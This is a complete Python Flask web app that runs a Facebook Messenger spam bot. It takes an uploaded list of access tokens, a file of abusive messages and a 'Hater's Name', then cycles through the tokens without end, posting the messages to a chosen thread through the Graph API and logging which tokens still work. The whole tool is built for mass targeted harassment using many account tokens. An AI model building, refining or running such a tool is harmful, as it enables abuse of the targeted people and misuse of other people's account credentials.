from flask import Flask, render_template_string, request, jsonify
import threading
import os
import requests
import time
import random
from datetime import datetime
from zoneinfo import ZoneInfo  # No external dependency; Python 3.9+

app = Flask(__name__)

# ================== GLOBAL TASK STORE ==================
# tasks[task_id] = {
#   "running": bool,
#   "logs": [str, ...],
#   "sent_ok": int,
#   "sent_fail": int,
#   "start_ts": datetime (IST),
#   "thread_id": str,
#   "group_name": str|None,
#   "token_status": {token: "unknown"|"valid"|"invalid"},
#   "tokens": [list of tokens],
#   "messages": [list of messages],
#   "delay": int
# }
tasks = {}
task_id_counter = 1
lock = threading.Lock()

IST = ZoneInfo("Asia/Kolkata")

# ================== ARYAN HTML ==================
html_template = """
<!DOCTYPE html>
<html lang="hi">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1.0"/>
  <title>🦅NOBITA.X.KOJA🦅</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@600;800&display=swap');

    :root{
      --bg1:#0b0b0f; --bg2:#180008; --bg3:#2b0008; --glow:#ff2b4a; --neon:#ff0033; --text:#e6e6e6;
      --ok:#00e676; --warn:#ffea00; --err:#ff5252; --info:#00e5ff;
    }
    *{box-sizing:border-box}
    body{
      margin:0; color:var(--text); font-family:'Orbitron',system-ui,sans-serif;
      background: radial-gradient(1200px 600px at 20% 10%, #21000a 0%, transparent 60%),
                  radial-gradient(900px 500px at 80% 30%, #12000a 0%, transparent 60%),
                  linear-gradient(135deg,var(--bg1),var(--bg2),var(--bg3));
      background-size: 400% 400%;
      animation: bgShift 18s ease-in-out infinite;
      min-height:100vh; padding:24px;
      display:flex; flex-direction:column; gap:22px; align-items:center;
    }
    @keyframes bgShift{0%{background-position:0% 50%}50%{background-position:100% 50%}100%{background-position:0% 50%}}

    .title{
      font-size: clamp(28px,4vw,56px);
      letter-spacing:2px;
      text-shadow:0 0 18px var(--neon),0 0 36px #ff5577;
      color:#fff; margin:4px 0 0;
    }
    .subtitle{
      margin:-6px 0 12px; opacity:.9; font-size:clamp(12px,2vw,14px);
    }

    .board{
      width:min(1200px,95vw);
      display:grid; grid-template-columns: 1.1fr .9fr; gap:18px;
    }
    @media (max-width:980px){ .board{grid-template-columns:1fr} }

    .card{
      background: rgba(0,0,0,.55);
      border:1px solid rgba(255, 64, 96, .35);
      box-shadow: 0 0 24px rgba(255,0,51,.25), inset 0 0 18px rgba(255,0,51,.08);
      border-radius:18px; padding:16px;
      backdrop-filter: blur(6px);
    }
    .card h3{
      margin:0 0 14px; font-size:18px; letter-spacing:1px;
      color:#fff; text-shadow:0 0 10px var(--neon);
      display:flex; align-items:center; gap:8px;
    }

    /* INPUTS with 7 color modes */
    .field{display:flex; flex-direction:column; gap:8px; margin:10px 0}
    .label{font-size:12px; opacity:.85; display:flex; justify-content:space-between}
    .hint{opacity:.75; font-size:11px}
    .inp{
      width:100%; padding:12px 14px; border:none; border-radius:12px;
      background:#0f0f14; color:#e9f9ff; outline:none; font-size:14px;
      box-shadow: inset 0 0 0 2px #222;
      transition: box-shadow .25s, transform .08s, background .25s, color .25s;
    }
    .inp:focus{ transform: translateY(-1px)}
    .mode-red:focus{ box-shadow: 0 0 12px #ff2448, inset 0 0 0 2px #ff2448; color:#ffdde3 }
    .mode-cyan:focus{ box-shadow: 0 0 12px #00e5ff, inset 0 0 0 2px #00e5ff; color:#d8fbff }
    .mode-lime:focus{ box-shadow: 0 0 12px #00e676, inset 0 0 0 2px #00e676; color:#e6ffe6 }
    .mode-violet:focus{ box-shadow: 0 0 12px #b388ff, inset 0 0 0 2px #b388ff; color:#f0e8ff }
    .mode-amber:focus{ box-shadow: 0 0 12px #ffb300, inset 0 0 0 2px #ffb300; color:#fff5dd }
    .mode-blue:focus{ box-shadow: 0 0 12px #448aff, inset 0 0 0 2px #448aff; color:#e8f0ff }
    .mode-rose:focus{ box-shadow: 0 0 12px #ff5c8d, inset 0 0 0 2px #ff5c8d; color:#ffe6ee }

    .file{
      padding:12px; border-radius:12px; background:#0f0f14; color:#bbb;
      box-shadow: inset 0 0 0 2px #222;
    }
    .file:focus{outline:none}

    .btn{
      width:100%; margin-top:8px; padding:12px 14px; border:none; border-radius:12px;
      font-weight:800; letter-spacing:.5px; cursor:pointer;
      background: linear-gradient(90deg, #b30024, #ff0033, #b30024);
      color:#fff; text-shadow:0 0 6px #000;
      box-shadow: 0 8px 24px rgba(255,0,51,.35);
      transition: transform .08s ease, filter .2s ease;
    }
    .btn:hover{ filter:brightness(1.08) }
    .btn:active{ transform: translateY(1px) }

    .btn-stop{
      background: linear-gradient(90deg, #2c0a0a, #b40000, #2c0a0a);
      box-shadow: 0 8px 24px rgba(255,64,64,.4);
    }

    /* LOG CONSOLE */
    .console{
      height: 420px; overflow-y:auto; padding:12px; border-radius:12px;
      background: #000; color:#9aff9a; font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
      box-shadow: inset 0 0 0 2px #0d2410, 0 0 22px rgba(0,255,128,.15);
      line-height:1.35;
    }
    .log-line{ white-space:pre-wrap; }
    .ok{color:var(--ok)} .err{color:var(--err)} .info{color:var(--info)} .warn{color:var(--warn)}

    /* STATS GRID */
    .stats{ display:grid; grid-template-columns: repeat(2,1fr); gap:10px }
    @media (max-width:520px){ .stats{grid-template-columns:1fr} }
    .tile{
      padding:12px; background:#101015; border-radius:12px; border:1px solid rgba(255,255,255,.06);
      box-shadow: inset 0 0 0 1px rgba(255,255,255,.04);
      display:flex; flex-direction:column; gap:4px
    }
    .kv{font-size:12px; opacity:.75}
    .vv{font-size:16px; font-weight:800}

    /* tiny akatsuki clouds */
    .cloud{
      position: fixed; pointer-events:none; opacity:.08; filter:drop-shadow(0 0 12px #ff395a);
      animation: floaty 16s ease-in-out infinite;
    }
    .cloud.c1{ top:6%; left:8%; transform: scale(1.2) }
    .cloud.c2{ bottom:8%; right:10%; transform: scale(1.1) }
    @keyframes floaty{0%{transform:translateY(0) scale(1)}50%{transform:translateY(-10px) scale(1.05)}100%{transform:translateY(0) scale(1)}}

    .footer{opacity:.75; font-size:12px}
  </style>
</head>
<body>
  <svg class="cloud c1" width="140" height="90" viewBox="0 0 140 90" fill="none" xmlns="http://www.w3.org/2000/svg">
    <path d="M20 60c-10-30 40-40 48-16 12-22 52-14 50 12 28 2 28 32-4 32H28C-2 88-2 62 20 60Z" fill="#ff0033" stroke="#fff" stroke-width="2"/>
  </svg>
  <svg class="cloud c2" width="160" height="100" viewBox="0 0 160 100" fill="none" xmlns="http://www.w3.org/2000/svg">
    <path d="M24 64c-12-32 44-44 54-18 12-24 58-16 56 14 30 2 30 36-4 36H34C0 96 0 66 24 64Z" fill="#ff0033" stroke="#fff" stroke-width="2"/>
  </svg>

  <div class="title">🦅🚩KOJA X NOBITA</div>
  <div class="subtitle"> WELCOME TO ARYAN SERVER </div>

  <div class="board">
    <!-- LEFT: FORM + BUTTONS + CONSOLE -->
    <div class="card">
      <h3>♡ Start New Task Babies ★</h3>
      <form id="mainForm" method="POST" enctype="multipart/form-data">
        <div class="field">
          <div class="label">
            <span>Upload Tokens File</span>
            <span class="hint">Example: HAR 1 TXT PER 1 TOKEN </span>
          </div>
          <input class="file inp mode-red" type="file" name="token_file" required />
        </div>

        <div class="field">
          <div class="label">
            <span>Upload Message Txt File</span>
            <span class="hint">Example: HAR TXT FILE PER 1 ABUSE </span>
          </div>
          <input class="file inp mode-cyan" type="file" name="message_file" required />
        </div>

        <div class="field">
          <div class="label">
            <span>Convo / Thread ID</span>
            <span class="hint">Example: 0000000000000</span>
          </div>
          <input class="inp mode-lime" type="text" name="thread_id" placeholder="e.g. 0000000000000" required />
        </div>

        <div class="field">
          <div class="label">
            <span>Hater's Name  </span>
            <span class="hint">Example: JAWNU </span>
          </div>
          <input class="inp mode-violet" type="text" name="prefix" placeholder="e.g.JAWNU" required />
        </div>

        <div class="field">
          <div class="label">
            <span>Delay (seconds)</span>
            <span class="hint">Example: 15 </span>
          </div>
          <input class="inp mode-amber" type="number" min="0" name="delay" placeholder="e.g. 15" required />
        </div>

        <button class="btn" type="submit">🚀 START TASK</button>
      </form>

      <div style="margin-top:14px; display:flex; gap:10px">
        <button class="btn btn-stop" id="btnStop" title="Only stops your current task">🛑 STOP CURRENT TASK</button>
      </div>

      <div style="margin-top:14px">
        <h3>📡 Live Logs (India Time)</h3>
        <div id="console" class="console" aria-live="polite"></div>
      </div>
    </div>

    <!-- RIGHT: STATS PANEL -->
    <div class="card">
      <h3>📊 Task Stats</h3>
      <div class="stats">
        <div class="tile"><div class="kv">Task ID</div><div class="vv" id="st_task">—</div></div>
        <div class="tile"><div class="kv">Thread ID</div><div class="vv" id="st_thread">—</div></div>
        <div class="tile"><div class="kv">Group Name</div><div class="vv" id="st_group">—</div></div>
        <div class="tile"><div class="kv">Status</div><div class="vv" id="st_status">—</div></div>
        <div class="tile"><div class="kv">Started (IST)</div><div class="vv" id="st_started">—</div></div>
        <div class="tile"><div class="kv">Uptime</div><div class="vv" id="st_uptime">—</div></div>
        <div class="tile"><div class="kv">Tokens (Total)</div><div class="vv" id="st_t_total">—</div></div>
        <div class="tile"><div class="kv">Tokens (Valid)</div><div class="vv" id="st_t_valid">—</div></div>
        <div class="tile"><div class="kv">Tokens (Invalid)</div><div class="vv" id="st_t_invalid">—</div></div>
        <div class="tile"><div class="kv">Messages Sent ✅</div><div class="vv" id="st_sent_ok">—</div></div>
        <div class="tile"><div class="kv">Messages Failed ❌</div><div class="vv" id="st_sent_fail">—</div></div>
        <div class="tile"><div class="kv">Delay (sec)</div><div class="vv" id="st_delay">—</div></div>
      </div>
    </div>
  </div>

  <div class="footer">یاریاں گینگ </div>

  <script>
    // cycle 7 color-modes on focus/click for inputs
    const modes = ["mode-red","mode-cyan","mode-lime","mode-violet","mode-amber","mode-blue","mode-rose"];
    document.querySelectorAll(".inp").forEach(inp=>{
      inp.addEventListener("click",()=>{
        let cur = modes.findIndex(m=>inp.classList.contains(m));
        inp.classList.remove(...modes);
        inp.classList.add(modes[(cur+1)%modes.length]);
      });
    });

    const consoleDiv = document.getElementById("console");
    let currentTaskId = null;
    let pollTimerLogs = null;
    let pollTimerStats = null;

    function appendConsole(lines){
      if(!lines || !lines.length) return;
      consoleDiv.innerHTML = lines.map(l => {
        let css = "log-line";
        if(l.includes("✅")) css += " ok";
        else if(l.includes("❌")) css += " err";
        else if(l.includes("⚠")) css += " warn";
        else css += " info";
        return `<div class="${css}">${l}</div>`;
      }).join("");
      consoleDiv.scrollTop = consoleDiv.scrollHeight;
    }

    async function pollLogs(){
      if(!currentTaskId) return;
      try{
        const res = await fetch("/logs/"+currentTaskId);
        const data = await res.json();
        appendConsole(data.logs || []);
      }catch(e){}
      pollTimerLogs = setTimeout(pollLogs, 1200);
    }

    async function pollStats(){
      if(!currentTaskId) return;
      try{
        const res = await fetch("/stats/"+currentTaskId);
        const s = await res.json();
        document.getElementById("st_task").textContent = s.task_id || "—";
        document.getElementById("st_thread").textContent = s.thread_id || "—";
        document.getElementById("st_group").textContent = s.group_name || "—";
        document.getElementById("st_status").textContent = s.running ? "RUNNING" : "STOPPED";
        document.getElementById("st_started").textContent = s.started_ist || "—";
        document.getElementById("st_uptime").textContent = s.uptime || "—";
        document.getElementById("st_t_total").textContent = s.tokens_total ?? "—";
        document.getElementById("st_t_valid").textContent = s.tokens_valid ?? "—";
        document.getElementById("st_t_invalid").textContent = s.tokens_invalid ?? "—";
        document.getElementById("st_sent_ok").textContent = s.sent_ok ?? "—";
        document.getElementById("st_sent_fail").textContent = s.sent_fail ?? "—";
        document.getElementById("st_delay").textContent = s.delay ?? "—";
      }catch(e){}
      pollTimerStats = setTimeout(pollStats, 1500);
    }

    document.getElementById("mainForm").onsubmit = async (e)=>{
      e.preventDefault();
      const fd = new FormData(e.target);
      const res = await fetch("/", { method:"POST", body: fd });
      const data = await res.json();
      currentTaskId = data.task_id;
      consoleDiv.innerHTML = `<div class="log-line info">[IST] Task Started (ID: ${currentTaskId})…</div>`;
      clearTimeout(pollTimerLogs); clearTimeout(pollTimerStats);
      pollLogs(); pollStats();
    };

    document.getElementById("btnStop").onclick = async ()=>{
      if(!currentTaskId) return;
      await fetch("/stop/"+currentTaskId, {method:"POST"});
      consoleDiv.innerHTML += `<div class="log-line err">🛑 Stopped Task: ${currentTaskId}</div>`;
    };
  </script>
</body>
</html>
"""

# ================== HELPERS ==================
def human_uptime(start_dt_ist: datetime) -> str:
    delta = datetime.now(IST) - start_dt_ist
    secs = int(delta.total_seconds())
    days, rem = divmod(secs, 86400)
    hrs, rem = divmod(rem, 3600)
    mins, secs = divmod(rem, 60)
    parts = []
    if days: parts.append(f"{days}d")
    if hrs: parts.append(f"{hrs}h")
    if mins: parts.append(f"{mins}m")
    parts.append(f"{secs}s")
    return " ".join(parts)

def try_fetch_group_name(thread_id: str, token: str) -> str|None:
    """
    Best-effort group/thread name fetch.
    If Graph API blocks the field, we just return None silently.
    """
    try:
        url = f"https://graph.facebook.com/v15.0/{thread_id}?fields=name"
        r = requests.get(url, params={"access_token": token}, timeout=8)
        if r.ok:
            data = r.json()
            name = data.get("name")
            if isinstance(name, str) and name.strip():
                return name.strip()
    except Exception:
        pass
    return None

# ================== SENDING LOOP ==================
def send_loop(task_id: str):
    t = tasks[task_id]
    tokens = t["tokens"]
    messages = t["messages"]
    thread_id = t["thread_id"]
    delay = t["delay"]
    prefix = t["prefix"]
    emojis = [" <3", " 3:)", " ;P", " ^_^", " :D", " ;)", " (y)", " Khan", " XD"]
    msg_index = 0

    t["logs"].append(f"[{datetime.now(IST).strftime('%H:%M:%S')}] 🟢 Task started.")

    # Try to fetch group name once
    if not t["group_name"] and tokens:
        gname = try_fetch_group_name(thread_id, tokens[0])
        if gname:
            t["group_name"] = gname
            t["logs"].append(f"[{datetime.now(IST).strftime('%H:%M:%S')}] ℹ Group Name: {gname}")
        else:
            t["logs"].append(f"[{datetime.now(IST).strftime('%H:%M:%S')}] ⚠ Group name unavailable (permissions)")

    while t["running"]:
        for token in tokens:
            if not t["running"]:
                break
            message_text = messages[msg_index % len(messages)]
            composed = f"{prefix} {message_text} {random.choice(emojis)}"
            url = f"https://graph.facebook.com/v15.0/t_{thread_id}"
            payload = {"access_token": token, "message": composed}

            now_ist = datetime.now(IST).strftime("%H:%M:%S")
            try:
                r = requests.post(url, data=payload, timeout=12)
                if r.ok:
                    t["sent_ok"] += 1
                    # lazy token validation
                    if t["token_status"].get(token, "unknown") != "valid":
                        t["token_status"][token] = "valid"
                    t["logs"].append(f"[{now_ist}] ✅ Sent → {composed}")
                else:
                    t["sent_fail"] += 1
                    # mark token invalid on first definitive failure
                    if t["token_status"].get(token, "unknown") == "unknown":
                        t["token_status"][token] = "invalid"
                    t["logs"].append(f"[{now_ist}] ❌ Fail [{r.status_code}] → {r.text[:160]}")
            except Exception as e:
                t["sent_fail"] += 1
                if t["token_status"].get(token, "unknown") == "unknown":
                    t["token_status"][token] = "invalid"
                t["logs"].append(f"[{now_ist}] ❌ Error → {str(e)[:160]}")

            time.sleep(delay)
        msg_index += 1

    t["logs"].append(f"[{datetime.now(IST).strftime('%H:%M:%S')}] 🔴 Task stopped.")

# ================== ROUTES ==================
@app.route("/", methods=["GET", "POST"])
def home():
    global task_id_counter
    if request.method == "POST":
        token_file = request.files["token_file"]
        message_file = request.files["message_file"]
        thread_id = request.form["thread_id"].strip()
        prefix = request.form["prefix"].strip()
        delay = int(request.form["delay"])

        tokens = []
        for raw in token_file.stream.readlines():
            line = raw.decode("utf-8", errors="ignore").strip()
            if line:
                tokens.append(line)

        messages = []
        for raw in message_file.stream.readlines():
            line = raw.decode("utf-8", errors="ignore").strip()
            if line:
                messages.append(line)

        if not tokens or not messages:
            return jsonify({"error":"Empty tokens/messages"}), 400

        with lock:
            task_id = str(task_id_counter)
            task_id_counter += 1
            tasks[task_id] = {
                "running": True,
                "logs": [],
                "sent_ok": 0,
                "sent_fail": 0,
                "start_ts": datetime.now(IST),
                "thread_id": thread_id,
                "group_name": None,
                "token_status": {tok: "unknown" for tok in tokens},
                "tokens": tokens,
                "messages": messages,
                "delay": delay,
                "prefix": prefix
            }

        th = threading.Thread(target=send_loop, args=(task_id,), daemon=True)
        th.start()
        return jsonify({"task_id": task_id})

    return render_template_string(html_template)

@app.route("/logs/<task_id>")
def logs(task_id):
    t = tasks.get(task_id)
    if not t:
        return jsonify({"logs": ["Invalid Task ID"]})
    # Keep console tidy: limit last N lines
    last = t["logs"][-800:]
    return jsonify({"logs": last})

@app.route("/stats/<task_id>")
def stats(task_id):
    t = tasks.get(task_id)
    if not t:
        return jsonify({"error":"Invalid Task ID"}), 404
    tokens_total = len(t["tokens"])
    tokens_valid = sum(1 for v in t["token_status"].values() if v == "valid")
    tokens_invalid = sum(1 for v in t["token_status"].values() if v == "invalid")
    return jsonify({
        "task_id": task_id,
        "running": t["running"],
        "thread_id": t["thread_id"],
        "group_name": t["group_name"] or "Unknown",
        "started_ist": t["start_ts"].strftime("%Y-%m-%d %H:%M:%S"),
        "uptime": human_uptime(t["start_ts"]),
        "tokens_total": tokens_total,
        "tokens_valid": tokens_valid,
        "tokens_invalid": tokens_invalid,
        "sent_ok": t["sent_ok"],
        "sent_fail": t["sent_fail"],
        "delay": t["delay"]
    })

@app.route("/stop/<task_id>", methods=["POST"])
def stop(task_id):
    t = tasks.get(task_id)
    if not t:
        return "Invalid Task ID", 404
    t["running"] = False
    return "Stopped"

if __name__ == "__main__":
    os.system("clear")
    print("\033[92m[+] Server running on http://127.0.0.1:5000 (IST logs enabled)\033[0m")
    app.run(host="0.0.0.0", port=5000)
